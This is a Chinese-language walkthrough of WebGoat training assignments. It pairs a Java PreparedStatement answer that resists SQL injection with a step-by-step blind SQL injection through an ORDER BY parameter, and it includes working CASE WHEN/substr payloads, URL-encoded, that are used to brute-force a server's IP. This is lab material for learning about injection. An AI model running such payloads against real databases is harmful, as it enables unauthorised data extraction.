要求：

    连接到数据库

    对不受SQL注入攻击的数据库执行查询

    您的查询至少需要包含一个字符串参数


开始前的一些提示：

    为了连接到数据库，可以简单地假设常量DBURL、DBUSER和DBPW为给定值。

    查询的内容无关紧要，只要SQL是有效的并且满足要求。

    您编写的所有代码都被插入到名为“TestClass”的java类的主方法中，该类已经导入java.sql语言


答案（仅供参考）：

try {  Connection ct = null;  ct=DriverManager.getConnection(DBURL,DBUSER,DBPW);  PreparedStatement ps=ct.prepareStatement("select * from users where name=?");  ps.setString(1, "XMTX");  ResultSet rs = ps.executeQuery();} catch (Exception e) {  System.out.println("404");}

题目要求

在此作业中，尝试通过 ORDER BY 字段执行 SQL 注入。  尝试找到webgoat-prd服务器的ip地址，猜测完整的ip地址可能需要很长时间，所以我们给你最后一部分：xxx.130.219.202   注意：此作业的提交字段不易受到 SQL 注入的影响。


这题是要我们查找出目标机的IP并给出了IP后面的一部分

首先尝试使用burp拦截按照Hostname排序的数据包


可以到参数column就是注入点了，在hostname后面加上单引号试试，可以看到报错


将报错中的SQL语句提取出来

select id, hostname, ip, mac, status, description from servers  where status <> 'out of order' order by hostname

构造payload

select id, hostname, ip, mac, status, description from servers  where status <> 'out of order' order by case when (true/false) then hostname else id end

当if条件为true时，按照hostname处理，为false时，按id处理

题目需要我们获取主机名为webgoat-prd的服务器的IP地址

SQL语句为：

select ip from servers where hostname='webgoat-prd'

需要爆破IP地址，再次构造payload

substr((select ip from servers where hostname='webgoat-prd'),1,1)=1

相结合的payload为

(case when (substring((select ip from servers where hostname='webgoat-prd'),1,1)=1) then hostname else id end)

最终将特殊符号进行url编码得到payload

(case%20when%20(substr((select%20ip%20from%20servers%20where%20hostname=%27webgoat-prd%27),1,1)=1)%20then%20hostname%20else%20id%20end)

将得到的payload放入数据包中


设置标记，方便我们筛选


进行爆破

可以得到IP地址为：104.130.219.202提交后显示Congratulations. You have successfully completed the assignment.（祝贺你。您已成功完成作业。）
